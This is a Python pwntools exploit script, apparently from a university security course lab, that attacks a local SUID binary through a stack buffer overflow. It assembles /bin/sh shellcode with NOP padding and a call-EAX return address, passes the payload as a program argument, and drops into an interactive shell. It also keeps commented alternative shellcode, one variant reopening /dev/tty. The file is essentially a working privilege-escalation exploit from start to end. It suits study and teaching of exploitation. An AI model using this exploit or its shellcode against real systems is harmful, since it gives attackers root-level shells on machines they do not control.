#!/usr/bin/env python3

import time, os, traceback, sys, os
import pwn
import binascii, array
from textwrap import wrap


# define payload here because it's passed as an argument to the binary:
callEAX=pwn.p32(0x08049019)
#payload=b'\x83\xc4\x18\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

# shell payload with pwntools
payload =  pwn.asm(pwn.shellcraft.i386.linux.sh(), arch="i386")

# shellstorm: 25 bytes shell
# payload=b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

NOPlen = 88-len(payload)
NOP = NOPlen*b"\x90"

payload = pwn.flat(
        [
            payload,
            NOP,
            callEAX
            ]
        )

def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath, payload], gdbscript=gdbscript, aslr=False, *a, **kw)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath, payload], aslr=False, *a, **kw)


binPath="/home/kali/ENPM691/Lecture7/suid_bof"
isRemote = pwn.args.REMOTE

# build in GDB support
gdbscript = '''
init-pwndbg
break *copyData+39
continue
'''.format(**locals())

# interact with the program to get to where we can exploit
pwn.context.log_level="debug"
io = start()
elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)

io.interactive()
